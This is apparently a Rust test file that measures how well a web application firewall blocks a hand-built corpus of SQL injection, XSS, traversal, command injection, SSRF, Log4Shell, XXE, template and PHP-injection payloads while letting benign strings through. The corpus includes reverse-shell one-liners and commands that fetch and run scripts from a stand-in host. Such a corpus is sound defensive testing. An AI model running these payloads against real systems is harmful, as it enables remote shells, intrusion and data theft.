//! WAF accuracy on a hand-built corpus of real-world attack payloads and tricky benign
//! values. Run with `cargo test --test waf_corpus -- --nocapture` to see the misses.

use pattern_guard_waf::Inspector;

const BLOCK: f64 = 7.0;

const ATTACKS: &[(&str, &str)] = &[
    // SQL injection
    ("sqli", "' OR '1'='1"),
    ("sqli", "' OR 1=1--"),
    ("sqli", "admin'--"),
    ("sqli", "admin' #"),
    ("sqli", "1' UNION SELECT username, password FROM users--"),
    ("sqli", "1 UNION ALL SELECT NULL,NULL,NULL--"),
    ("sqli", "1; DROP TABLE users"),
    ("sqli", "' AND SLEEP(5)--"),
    ("sqli", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
    ("sqli", "1 AND 1=1"),
    ("sqli", "' UNION/**/SELECT 1,2,3--"),
    ("sqli", "1 un/**/ion sel/**/ect 1,2"),
    ("sqli", "%27%20OR%20%271%27%3D%271"),
    ("sqli", "1' ORDER BY 3--"),
    ("sqli", "'; EXEC xp_cmdshell('dir')--"),
    ("sqli", "1' AND extractvalue(1,concat(0x7e,version()))--"),
    ("sqli", "1)) OR ((1=1"),
    ("sqli", "' or ''='"),
    (
        "sqli",
        "1 AND 1=2 UNION SELECT table_name FROM information_schema.tables",
    ),
    ("sqli", "1;WAITFOR DELAY '0:0:5'--"),
    ("sqli", "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2--"),
    // XSS
    ("xss", "<script>alert(1)</script>"),
    ("xss", "<img src=x onerror=alert(1)>"),
    ("xss", "<svg onload=alert(document.domain)>"),
    ("xss", "javascript:alert(document.cookie)"),
    ("xss", "\"><script>alert(1)</script>"),
    ("xss", "<iframe src=javascript:alert(1)>"),
    ("xss", "<body onload=alert('XSS')>"),
    ("xss", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
    ("xss", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    (
        "xss",
        "<a href=\"javascript:void(0)\" onclick=\"alert(1)\">x</a>",
    ),
    ("xss", "<details open ontoggle=alert(1)>"),
    ("xss", "<scr<script>ipt>alert(1)</script>"),
    ("xss", "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"),
    ("xss", "<svg/onload=alert`1`>"),
    ("xss", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
    ("xss", "'-alert(1)-'"),
    // path traversal
    ("traversal", "../../../../etc/passwd"),
    ("traversal", "..%2f..%2f..%2fetc%2fpasswd"),
    ("traversal", "....//....//....//etc/passwd"),
    ("traversal", "..\\..\\..\\windows\\win.ini"),
    ("traversal", "/var/www/../../etc/shadow"),
    ("traversal", "../../../../proc/self/environ"),
    ("traversal", "%252e%252e%252fetc%252fpasswd"),
    ("traversal", "../../../../../../../../boot.ini"),
    ("traversal", "../../../../../../../../tmp/x"),
    ("traversal", "file.txt%00.png"),
    // command injection
    ("cmdi", "; cat /etc/passwd"),
    ("cmdi", "| whoami"),
    ("cmdi", "&& wget http://evil.example/x.sh"),
    ("cmdi", "`id`"),
    ("cmdi", "$(curl http://evil.example/x|sh)"),
    ("cmdi", "; nc -e /bin/sh 10.0.0.1 4444"),
    ("cmdi", "127.0.0.1; ls -la"),
    ("cmdi", "|| ping -c 10 127.0.0.1"),
    ("cmdi", "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
    ("cmdi", "a;${IFS}cat${IFS}/etc/passwd"),
    // SSRF
    ("ssrf", "http://169.254.169.254/latest/meta-data/"),
    ("ssrf", "gopher://127.0.0.1:6379/_FLUSHALL"),
    ("ssrf", "file:///etc/passwd"),
    (
        "ssrf",
        "http://metadata.google.internal/computeMetadata/v1/",
    ),
    ("ssrf", "dict://localhost:11211/stat"),
    ("ssrf", "http://127.0.0.1:8080/admin"),
    // Log4Shell
    ("jndi", "${jndi:ldap://evil.example/a}"),
    ("jndi", "${${lower:j}ndi:${lower:l}dap://x/a}"),
    ("jndi", "${${::-j}${::-n}${::-d}${::-i}:rmi://x/a}"),
    ("jndi", "${jndi:dns://x}"),
    // XXE
    (
        "xxe",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    ),
    (
        "xxe",
        "<!DOCTYPE r [<!ENTITY % ext SYSTEM \"http://evil.example/x.dtd\"> %ext;]>",
    ),
    // SSTI
    ("ssti", "{{7*7}}"),
    ("ssti", "${7*7}"),
    ("ssti", "{{config.items()}}"),
    ("ssti", "{{''.__class__.__mro__[1].__subclasses__()}}"),
    ("ssti", "<%= 7*7 %>"),
    ("ssti", "${T(java.lang.Runtime).getRuntime().exec('id')}"),
    // NoSQL
    ("nosql", "[$ne]"),
    ("nosql", "{\"$where\": \"sleep(5000)\"}"),
];

const BENIGN: &[&str] = &[
    "O'Brien",
    "Rock'n'Roll",
    "It's a lovely day; isn't it?",
    "select a dress from the summer collection",
    "European Union selects new president",
    "JavaScript: The Good Parts",
    "1 + 1 = 2",
    "a < b && c > d",
    "Tom & Jerry",
    "salt & pepper",
    "I'm a C# developer",
    "Price: $10 - $20",
    "50% off!",
    "100%",
    "email@example.com",
    "https://example.com/path?x=1&y=2",
    "../images/logo.png",
    "SELECT your seat",
    "drop-down menu",
    "Update: new features; update your app",
    "<b>bold</b> and <i>italic</i>",
    "I love <3 cats",
    "Hello {{name}}, welcome",
    "use $(document).ready in jQuery",
    "path/to/file.txt",
    "SELECT * FROM users is the query we run nightly",
    "order by price",
    "\"quoted\" text",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
    "cat videos | dogs",
    "rm -rf is dangerous, don't run it",
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk",
    "/api/v1/users/123",
    "name=John&age=30",
    "café crème brûlée",
    "日本語のテキスト",
    "{\"a\":1}",
    "Learn about ${variable} interpolation",
    "2024-01-01T10:00:00Z",
    "+1 (555) 123-4567",
    "Q&A: what's new?",
    "fish & chips; mushy peas",
    "He said \"hi\" and left",
    "x = y + z / 2",
    "#hashtag",
    "50 or 60 people attended",
    "where is the nearest store?",
    "I'd like 1 or 2 items",
    "copy the text and paste; then save",
    "if a > b then c",
    "<p>Paragraph</p>",
    "localhost is my dev machine",
    "the file is at C:/Users/me/Documents",
    "Smith-Jones, Anna-Marie",
    "user_id=42&sort=desc&page=3",
    "Thanks! :) ;)",
    "Call me at 9 or 10 o'clock",
    "Is 2>1? Yes, and 1<2.",
    "\"Don't\" say 'never'",
    "admin",
    "union station",
    "eval is evil in JS",
];

#[test]
fn waf_corpus_accuracy() {
    let w = Inspector::new();
    let mut misses = Vec::new();
    for (class, payload) in ATTACKS {
        let score = w
            .inspect_value("test", payload, true)
            .map(|f| f.score)
            .unwrap_or(0.0);
        if score < BLOCK {
            misses.push(format!("{class:9} {score:4.1}  {payload}"));
        }
    }
    let mut false_blocks = Vec::new();
    let mut logged = 0;
    for payload in BENIGN {
        let f = w.inspect_value("test", payload, true);
        let score = f.as_ref().map(|f| f.score).unwrap_or(0.0);
        if score >= BLOCK {
            false_blocks.push(format!(
                "{score:4.1}  {payload}  {:?}",
                f.map(|f| f.indicators)
            ));
        } else if score >= 4.0 {
            logged += 1;
        }
    }
    let detected = ATTACKS.len() - misses.len();
    println!(
        "WAF corpus: blocked {detected}/{} attacks ({:.1}%), false blocks {}/{} benign, {logged} benign values logged (score 4–7)",
        ATTACKS.len(),
        100.0 * detected as f64 / ATTACKS.len() as f64,
        false_blocks.len(),
        BENIGN.len()
    );
    for m in &misses {
        println!("  missed: {m}");
    }
    for b in &false_blocks {
        println!("  FALSE BLOCK: {b}");
    }
    assert!(
        false_blocks.is_empty(),
        "benign values blocked: {false_blocks:#?}"
    );
    assert!(
        detected as f64 >= ATTACKS.len() as f64 * 0.9,
        "detection below 90%: {misses:#?}"
    );
}

/// ROADMAP M2 acceptance: PHP code plus an OS command in a multipart form field (the shape
/// of PHP2Shell-style exploits targeting PHP_SESSION_UPLOAD_PROGRESS) is blocked with no
/// CVE-specific rule.
#[test]
fn php_code_execution_in_multipart_field_is_blocked() {
    use pattern_guard_waf::{AttackClass, HttpRequest};
    let w = Inspector::new();
    let part =
        "--X\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n";
    for payload in [
        "<?php system('id'); ?>",
        "<?=`id`?>",
        "<?php passthru($_GET['c']); ?>",
        "<?php eval(base64_decode('aWQ=')); ?>",
    ] {
        let body = format!(
            "{part}{payload}\r\n--X\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.txt\"\r\n\r\nhello\r\n--X--\r\n"
        );
        let r = w.inspect(&HttpRequest {
            path_and_query: "/index.php",
            headers: &[],
            content_type: Some("multipart/form-data; boundary=X"),
            body: body.as_bytes(),
        });
        let top = r.top().expect("a finding");
        assert!(top.score >= BLOCK, "{payload}: score {}", top.score);
        assert_eq!(top.class, AttackClass::PhpInjection, "{payload}");
    }
}
